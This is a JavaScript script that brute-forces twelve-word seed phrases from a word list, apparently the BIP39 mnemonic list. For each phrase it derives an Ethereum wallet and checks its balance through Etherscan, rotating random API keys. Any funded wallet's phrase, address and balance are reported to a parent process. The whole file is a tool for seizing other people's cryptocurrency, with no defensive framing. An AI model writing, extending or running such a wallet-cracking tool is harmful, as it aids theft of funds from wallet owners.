import { EtherscanProvider, Wallet, getDefaultProvider } from "ethers";
import {
  COUNT_TO_INFORM_PARENT,
  FAKE_TEST_WALLET_COUNT,
  WORDS,
} from "./constants.js";
import ApiKeys from "./api_keys.js";

const date = Date.now();

let a,
  b,
  c,
  d,
  e,
  f,
  g,
  h,
  k,
  l,
  m,
  n = 0;
let startIndeces = Array(12)
  .fill(0)
  .map((a) => Math.trunc(Math.random() * WORDS.length));

let step = 0;

function sendParent(obj) {
  process.stdout.write(JSON.stringify(obj));
}

const startDate = Date.now();
for (a = startIndeces[0]; a < WORDS.length; a++) {
  if ([b, c, d, e, f, g, h, k, l, m, n].includes(a)) continue;
  for (b = startIndeces[1]; b < WORDS.length; b++) {
    if ([a, c, d, e, f, g, h, k, l, m, n].includes(b)) continue;
    for (c = startIndeces[2]; c < WORDS.length; c++) {
      if ([a, b, d, e, f, g, h, k, l, m, n].includes(c)) continue;
      for (d = startIndeces[3]; d < WORDS.length; d++) {
        if ([a, b, c, e, f, g, h, k, l, m, n].includes(d)) continue;
        for (e = startIndeces[4]; e < WORDS.length; e++) {
          if ([a, b, c, d, f, g, h, k, l, m, n].includes(e)) continue;
          for (f = startIndeces[5]; f < WORDS.length; f++) {
            if ([a, b, c, d, e, g, h, k, l, m, n].includes(f)) continue;
            for (g = startIndeces[6]; g < WORDS.length; g++) {
              if ([a, b, c, d, e, f, h, k, l, m, n].includes(g)) continue;
              for (h = startIndeces[7]; h < WORDS.length; h++) {
                if ([a, b, c, d, e, f, g, k, l, m, n].includes(h)) continue;
                for (k = startIndeces[8]; k < WORDS.length; k++) {
                  if ([a, b, c, d, e, f, g, h, l, m, n].includes(k)) continue;
                  for (l = startIndeces[9]; l < WORDS.length; l++) {
                    if ([a, b, c, d, e, f, g, h, k, m, n].includes(l)) continue;
                    for (m = startIndeces[10]; m < WORDS.length; m++) {
                      if ([a, b, c, d, e, f, g, h, k, l, n].includes(m))
                        continue;
                      for (n = startIndeces[11]; n < WORDS.length; n++) {
                        if ([a, b, c, d, e, f, g, h, k, l, m].includes(n))
                          continue;
                        // if (a == 0 && b == 0 && c == 0 && d == 0 && e == 0 && f == 0 && g == 0
                        //   && h == 0 && k == 0 && l == 0) continue;
                        const phrase = `${WORDS[a]} ${WORDS[b]} ${WORDS[c]} ${WORDS[d]} ${WORDS[e]} ${WORDS[f]} ${WORDS[g]} ${WORDS[h]} ${WORDS[k]} ${WORDS[l]} ${WORDS[m]} ${WORDS[n]}`;

                        try {
                          const wallet = Wallet.fromPhrase(phrase);
                          const provider = new EtherscanProvider(
                            undefined,
                            ApiKeys.getRandom()
                          );
                          const address = await wallet.getAddress();
                          const balance = await provider.getBalance(address);

                          if (++step % COUNT_TO_INFORM_PARENT == 0) {
                            sendParent({
                              count: COUNT_TO_INFORM_PARENT,
                            });
                          }

                          if (
                            balance > 0n
                          ) {
                            sendParent({
                              walletFound: {
                                phrase,
                                balance: balance.toString(),
                                address,
                              },
                            });
                          }
                        } catch (e) {}
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
